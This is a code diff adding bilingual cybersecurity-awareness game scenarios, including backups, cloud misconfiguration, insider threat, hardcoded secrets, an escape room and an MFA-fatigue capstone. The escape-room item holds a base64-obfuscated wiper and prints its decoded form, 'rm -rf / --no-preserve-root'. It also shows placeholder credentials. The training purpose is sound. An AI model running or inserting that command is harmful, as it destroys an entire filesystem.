+                "body": "An external agency needs to test their email recommendation algorithm. They ask for a direct export of the `users` table including Full Name, Email, Phone, Aadhaar/SSN, and Plaintext Passwords. How should you handle this?",
+                "is_threat": True,
+                "explanation_en": "Exporting unmasked PII and plain passwords to a vendor violates every global privacy regulation and constitutes a catastrophic breach.",
+                "explanation_hi": "बिना मास्क किए व्यक्तिगत डेटा और पासवर्ड किसी एजेंसी को देना भारी कानूनी और सुरक्षा उल्लंघन है।",
+                "warning_signs_en": "Unredacted PII export, sharing with non-cleared third parties.",
+                "warning_signs_hi": "असुरक्षित व्यक्तिगत डेटा, गैर-सत्यापित बाहरी एजेंसी से साझा करना।",
+                "choices": [
+                    ("Email them the full unencrypted SQL dump", False, "Direct violation of GDPR and DPDP punishable by severe fines.", "कानून का खुला उल्लंघन जिस पर भारी जुर्माना लग सकता है।"),
+                    ("Refuse unredacted export; provide anonymized, synthetic test data with zero PII", True, "Spot on! Data minimization and synthetic testing protect consumer privacy.", "सही! परीक्षण के लिए केवल अनाम और कृत्रिम डेटा ही देना चाहिए।"),
+                    ("Post the database to a public GitHub repository for easy downloading", False, "Makes all customer credentials public to the entire world.", "सभी ग्राहकों का डेटा पूरी दुनिया के लिए सार्वजनिक हो जाएगा।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "backup-recovery-mission",
+        "title_en": "Backup and Recovery Mission",
+        "title_hi": "बैकअप और रिकवरी मिशन",
+        "category": "privacy_secops",
+        "category_title_en": "Privacy & SecOps",
+        "category_title_hi": "गोपनीयता और सुरक्षा संचालन",
+        "instructions_en": "Implement the gold standard 3-2-1 backup strategy with immutable, air-gapped snapshots.",
+        "instructions_hi": "3-2-1 बैकअप रणनीति और सुरक्षित ऑफलाइन प्रतियों का महत्व समझें।",
+        "debrief_en": "A backup that has never been tested is not a backup. Modern ransomware actively seeks out and deletes online backups before encrypting.",
+        "debrief_hi": "जिस बैकअप का परीक्षण न किया गया हो, उस पर भरोसा न करें। रैनसमवेयर पहले बैकअप को ही मिटाता है।",
+        "difficulty": "intermediate",
+        "timed": False,
+        "xp": 40,
+        "order_index": 25,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "Disaster Recovery Architect",
+                "subject": "Designing Ransomware-Resistant Backup Architecture",
+                "body": "Which architecture fulfills the 3-2-1 backup rule against ransomware?\nA: 1 copy stored on the same server's C: drive\nB: 3 copies of data, across 2 different media types, with 1 copy kept offline/immutable off-site\nC: Storing everything in a single public Dropbox folder",
+                "is_threat": False,
+                "explanation_en": "3-2-1 Rule: 3 copies of data, 2 different storage media types, 1 offsite/immutable copy that cannot be deleted even with compromised admin credentials.",
+                "explanation_hi": "3-2-1 नियम: 3 प्रतियां, 2 अलग-अलग मीडिया, 1 सुरक्षित ऑफलाइन या दूरस्थ प्रति।",
+                "warning_signs_en": "Online backups without immutability or air-gapping are easily wiped by attackers.",
+                "warning_signs_hi": "ऑनलाइन बैकअप को हैकर्स आसानी से डिलीट कर सकते हैं।",
+                "choices": [
+                    ("Architecture A (Same C: drive)", False, "When the machine is encrypted, the backup is encrypted simultaneously.", "जब मशीन लॉक होगी, तो बैकअप भी साथ ही लॉक हो जाएगा।"),
+                    ("Architecture B (3-2-1 rule with offsite immutable storage)", True, "Flawless! Immutable air-gapped copies guarantee operational recovery.", "उत्कृष्ट! 3-2-1 नियम और ऑफलाइन स्टोरेज ही असली सुरक्षा है।"),
+                    ("Architecture C (Single Dropbox folder)", False, "Easily overwritten or deleted via ransomware sync.", "सिंक होते ही रैनसमवेयर ड्रॉपबॉक्स फाइलें भी खराब कर देगा।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "cloud-misconfiguration-hunt",
+        "title_en": "Cloud Misconfiguration Hunt",
+        "title_hi": "क्लाउड मिसकॉन्फिगरेशन हंट",
+        "category": "privacy_secops",
+        "category_title_en": "Privacy & SecOps",
+        "category_title_hi": "गोपनीयता और सुरक्षा संचालन",
+        "instructions_en": "Audit public cloud infrastructure for open S3 buckets, permissive security groups (0.0.0.0/0), and hardcoded cloud IAM secrets.",
+        "instructions_hi": "क्लाउड सुरक्षा में खुली स्टोरेज बकेट्स और कमजोर फ़ायरवॉल नियमों की पहचान करें।",
+        "debrief_en": "Cloud misconfigurations cause the vast majority of enterprise cloud breaches. Keep storage buckets private and restrict SSH/RDP ingress.",
+        "debrief_hi": "क्लाउड में अधिकांश डेटा लीक गलत कॉन्फ़िगरेशन के कारण होते हैं। स्टोरेज को हमेशा निजी रखें।",
+        "difficulty": "intermediate",
+        "timed": False,
+        "xp": 45,
+        "order_index": 26,
+        "scenarios": [
+            {
+                "type": "terminal",
+                "sender": "AWS / Cloud Security Posture Management (CSPM)",
+                "subject": "High-Severity Risk: Ingress Security Group Audit",
+                "body": "Resource: sg-088192a (Production Database Security Group)\nRule: Inbound TCP Port 5432 (PostgreSQL)\nSource: 0.0.0.0/0 (ANY IP ON THE INTERNET)\nWhat is the security hazard?",
+                "is_threat": True,
+                "explanation_en": "Exposing production database port 5432 directly to 0.0.0.0/0 allows anyone on the internet to attempt brute-force logins or exploit zero-day DB vulnerabilities.",
+                "explanation_hi": "डेटाबेस पोर्ट को पूरी दुनिया (0.0.0.0/0) के लिए खोलना इंटरनेट पर किसी को भी हमले का निमंत्रण देना है।",
+                "warning_signs_en": "Database ports exposed to 0.0.0.0/0 rather than internal application VPC subnets.",
+                "warning_signs_hi": "डेटाबेस को केवल आंतरिक नेटवर्क के बजाय पूरे इंटरनेट के लिए खोलना।",
+                "choices": [
+                    ("No risk; PostgreSQL always requires a password", False, "Passwards can be brute-forced or bypassed via zero-day vulnerabilities.", "पासवर्ड का अनुमान लगाया जा सकता है या कमियों से बायपास किया जा सकता है।"),
+                    ("Restrict ingress strictly to internal App Server subnet security group", True, "Spot on! Database tiers must never be directly accessible from the public internet.", "सही! डेटाबेस केवल आंतरिक ऐप सर्वर से ही कनेक्ट होना चाहिए।"),
+                    ("Change the port number to 5433 to completely hide the database", False, "Security through obscurity fails against basic port scanners.", "केवल पोर्ट नंबर बदलने से सुरक्षा नहीं मिलती।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "insider-threat-investigation",
+        "title_en": "Insider Threat Investigation",
+        "title_hi": "इनसाइडर थ्रेट इन्वेस्टिगेशन",
+        "category": "privacy_secops",
+        "category_title_en": "Privacy & SecOps",
+        "category_title_hi": "गोपनीयता और सुरक्षा संचालन",
+        "instructions_en": "Detect behavioral anomalies: unusual off-hours mass downloads, disgruntled employee exfiltration, and unauthorized privilege use.",
+        "instructions_hi": "आंतरिक कर्मचारियों द्वारा असामान्य समय पर डेटा डाउनलोड और डेटा चोरी की गतिविधियों को पकड़ें।",
+        "debrief_en": "Insider threats can be malicious or negligent. User and Entity Behavior Analytics (UEBA) helps identify anomalous data movement before departure.",
+        "debrief_hi": "आंतरिक खतरे कंपनी के कर्मचारियों द्वारा अनजाने में या जानबूझकर पैदा होते हैं। डेटा गतिविधि पर नजर रखना जरूरी है।",
+        "difficulty": "advanced",
+        "timed": False,
+        "xp": 50,
+        "order_index": 27,
+        "scenarios": [
+            {
+                "type": "log",
+                "sender": "Data Loss Prevention (DLP) Dashboard",
+                "subject": "Anomalous Outbound Transfer: Resigning Engineer",
+                "body": "User: lead_dev_01 (Submitted resignation 2 days ago)\nActivity: Sunday 01:22 AM\nEvent: Downloaded 4.2 GB of Git proprietary source code repos and copied to personal USB drive labeled 'MyBackup'. What action should SecOps take?",
+                "is_threat": True,
+                "explanation_en": "Classic intellectual property theft by departing personnel. Immediate access suspension and forensic preservation of workstation artifacts is required.",
+                "explanation_hi": "इस्तीफा देने वाले कर्मचारी द्वारा कोड चोरी का प्रयास। तुरंत एक्सेस बंद करना और कानूनी साक्ष्य सहेजना जरूरी है।",
+                "warning_signs_en": "Resignation status, off-hours access, massive repository cloning to removable media.",
+                "warning_signs_hi": "इस्तीफे के बाद असमय बड़े पैमाने पर डेटा डाउनलोड करना।",
+                "choices": [
+                    ("Ignore it because they might need the code for their new job", False, "Direct theft of corporate trade secrets and intellectual property.", "कंपनी के गोपनीय कोड और व्यापारिक रहस्यों की खुली चोरी।"),
+                    ("Revoke all IAM/VPN credentials immediately and initiate corporate legal/HR hold", True, "Flawless! Fast credential revocation prevents further intellectual property loss.", "उत्कृष्ट! तुरंत एक्सेस बंद करके कानूनी प्रक्रिया शुरू करना सही कदम है।"),
+                    ("Send a polite Slack message asking if they had fun downloading", False, "Gives the individual time to destroy evidence or exfiltrate more.", "व्यक्ति को साक्ष्य मिटाने का मौका मिल जाएगा।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "secure-coding-challenge",
+        "title_en": "Secure Coding Challenge",
+        "title_hi": "सिक्योर कोडिंग चैलेंज",
+        "category": "privacy_secops",
+        "category_title_en": "Privacy & SecOps",
+        "category_title_hi": "गोपनीयता और सुरक्षा संचालन",
+        "instructions_en": "Identify hardcoded API secrets, insecure deserialization, path traversal, and sensitive error stack traces.",
+        "instructions_hi": "सोर्स कोड में छिपे हुए पासवर्ड, असुरक्षित फंक्शन और सुरक्षा कमियों की पहचान करें।",
+        "debrief_en": "Never hardcode cryptographic keys or database credentials in source code. Inject secrets at runtime via environment variables or secret vaults.",
+        "debrief_hi": "सोर्स कोड में कभी भी पासवर्ड या सीक्रेट कीज न लिखें। हमेशा एनवायरनमेंट वेरिएबल्स का उपयोग करें।",
+        "difficulty": "intermediate",
+        "timed": False,
+        "xp": 45,
+        "order_index": 28,
+        "scenarios": [
+            {
+                "type": "terminal",
+                "sender": "Static Application Security Testing (SAST) Scanner",
+                "subject": "Code Quality Review: config/database.py",
+                "body": "Line 14:  AWS_SECRET_KEY = 'AKIAIOSFODNN7EXAMPLE'\nLine 15:  DB_PASSWORD = 'ProductionSuperSecretPassword123!'\nLine 16:  DEBUG = True\nWhat are the primary vulnerabilities in this snippet?",
+                "is_threat": True,
+                "explanation_en": "Hardcoded production credentials committed to git will be leaked. DEBUG=True exposes interactive debugger consoles and stack traces to visitors.",
+                "explanation_hi": "कोड में पासवर्ड लिखना और DEBUG=True रखना गंभीर कमियां हैं जिससे पूरा सिस्टम हैक हो सकता है।",
+                "warning_signs_en": "Hardcoded AWS secret keys, database passwords in plaintext, DEBUG enabled.",
+                "warning_signs_hi": "कोड में सीधे पासवर्ड लिखना, डीबग मोड खुला रखना।",
+                "choices": [
+                    ("Code looks clean and ready for production deployment", False, "Severely insecure; committing credentials to git invites immediate breach.", "अत्यंत असुरक्षित; गिट में पासवर्ड जाने से तुरंत हैकिंग हो सकती है।"),
+                    ("Move secrets to environment variables/vault and disable DEBUG mode in production", True, "Spot on! The 12-Factor App methodology mandates externalized configuration.", "सही! पासवर्ड को एनवायरनमेंट वेरिएबल्स में रखें और डीबग मोड बंद करें।"),
+                    ("Add a code comment saying 'Please do not read this password'", False, "Comments are visible to anyone with repository access.", "टिप्पणी लिखने से सुरक्षा नहीं मिलती।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "cybersecurity-escape-room",
+        "title_en": "Cybersecurity Escape Room",
+        "title_hi": "साइबर सुरक्षा एस्केप रूम",
+        "category": "privacy_secops",
+        "category_title_en": "Privacy & SecOps",
+        "category_title_hi": "गोपनीयता और सुरक्षा संचालन",
+        "instructions_en": "Solve a multi-stage chained puzzle: decode a Base64 encoded payload, inspect a decoy certificate, and close a backdoor port.",
+        "instructions_hi": "एक बहु-चरणीय पहेली सुलझाएं: एन्कोडेड पेलोड डिकोड करें और बैकडोर पोर्ट बंद करें।",
+        "debrief_en": "Adversaries chain multiple minor weaknesses to achieve full system control. Defense-in-depth ensures that failing one barrier does not forfeit the castle.",
+        "debrief_hi": "हमलावर कई छोटी कमियों को जोड़कर बड़ा हमला करते हैं। बहुस्तरीय सुरक्षा ही इसका सही समाधान है।",
+        "difficulty": "advanced",
+        "timed": True,
+        "xp": 60,
+        "order_index": 29,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "Escape Mission Control",
+                "subject": "Stage 1: Decoding the Adversary's Obfuscated Dropper",
+                "body": "You intercept this terminal command on a compromised server:\necho 'cm0gLXJmIC8gLS1uby1wcmVzZXJ2ZS1yb290' | base64 -d\nWhat does the decoded string command do?",
+                "is_threat": True,
+                "explanation_en": "The Base64 string decodes to 'rm -rf / --no-preserve-root', a catastrophic command designed to wipe the entire filesystem.",
+                "explanation_hi": "यह बेस64 कोड 'rm -rf /' में बदलता है जो पूरे कंप्यूटर का सारा डेटा मिटाने का खतरनाक आदेश है।",
+                "warning_signs_en": "Base64 piped into execution shell indicates obfuscated destructive payload.",
+                "warning_signs_hi": "बेस64 कोड को सीधे शेल में चलाना दुर्भावनापूर्ण इरादे का संकेत है।",
+                "choices": [
+                    ("It safely prints system hardware specs to screen", False, "Incorrect! This is a devastating destructive command.", "गलत! यह सिस्टम का सारा डेटा मिटाने वाला आदेश है।"),
+                    ("Destructive wiper command attempting to delete all filesystem files", True, "Brilliant! Decoding obfuscated commands exposes adversary objectives.", "शानदार! एन्कोडेड कोड का विश्लेषण करके आपने विनाशकारी हमले को पहचाना।"),
+                    ("It updates the system timezone to UTC", False, "Completely incorrect interpretation.", "पूरी तरह गलत समझ।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "ultimate-human-firewall",
+        "title_en": "Ultimate Human Firewall",
+        "title_hi": "अल्टीमेट ह्यूमन फ़ायरवॉल",
+        "category": "privacy_secops",
+        "category_title_en": "Privacy & SecOps",
+        "category_title_hi": "गोपनीयता और सुरक्षा संचालन",
+        "instructions_en": "The Grand Capstone: Face a simulated multi-vector Advanced Persistent Threat (APT) attack combining phishing, MFA evasion, and data exfiltration.",
+        "instructions_hi": "अंतिम महा-चुनौती: एक साथ कई दिशाओं से होने वाले संगठित साइबर हमले को विफल करें।",
+        "debrief_en": "Congratulations on completing the Human Firewall curriculum. Technology alone cannot secure an organization — informed, alert humans are the ultimate defense.",
+        "debrief_hi": "बधाई हो! केवल तकनीक किसी संगठन को सुरक्षित नहीं कर सकती — सतर्क और जागरूक मानव ही असली फ़ायरवॉल हैं।",
+        "difficulty": "capstone",
+        "timed": True,
+        "xp": 100,
+        "order_index": 30,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "Global Cyber Defense Command",
+                "subject": "Capstone Scenario: Multi-Vector Breach Defense",
+                "body": "An attacker sends a spear-phishing email to your team, rings your desk phone claiming to be IT support, and simultaneously floods your phone with 2FA prompts to authorize an overseas login. What is your holistic Human Firewall reaction?",
+                "is_threat": True,
+                "explanation_en": "A multi-pronged attack requires calm coordination: Deny MFA prompts, hang up the phone, do not click the email link, and immediately notify SecOps to initiate incident triage.",
+                "explanation_hi": "बहुस्तरीय हमले में घबराएं नहीं: एमएफए अस्वीकार करें, फोन काटें, लिंक पर क्लिक न करें और तुरंत सुरक्षा टीम को सूचित करें।",
+                "warning_signs_en": "Coordinated multi-channel social engineering barrage (Email + Voice + MFA Push).",
+                "warning_signs_hi": "एक साथ कई माध्यमों (ईमेल, फोन, एमएफए) से किया गया संगठित हमला।",
+                "choices": [
+                    ("Panic, approve the MFA prompt, and click the email to read the invoice", False, "Total system failure; the attacker wins.", "पूरी सुरक्षा विफल; हमलावर सफल हो जाएगा।"),
+                    ("Deny MFA, hang up phone, do not click email, and alert SecOps immediately", True, "Victory! You have demonstrated the gold standard of Human Firewall cyber defense.", "अद्भुत विजय! आपने साबित कर दिया कि आप एक सच्चे ह्यूमन फ़ायरवॉल हैं।"),
+                    ("Turn off all computers in the building and run away", False, "Uncontrolled panic without reporting leaves the threat unresolved.", "बिना सूचना दिए भागने से समस्या हल नहीं होती।")
+                ]
+            }
+        ]
+    }
+]
+
+# Enrich games with progressive multi-level scenarios (Beginner, Intermediate, Advanced)
+try:
+    from app.services.catalog_games_progressive import PROGRESSIVE_SCENARIOS
+    for _game in GAMES_30:
+        _slug = _game.get("slug")
+        if _slug in PROGRESSIVE_SCENARIOS:
+            for _extra in PROGRESSIVE_SCENARIOS[_slug]:
+                _game["scenarios"].append(_extra)
+except ImportError:
+    pass
+
+
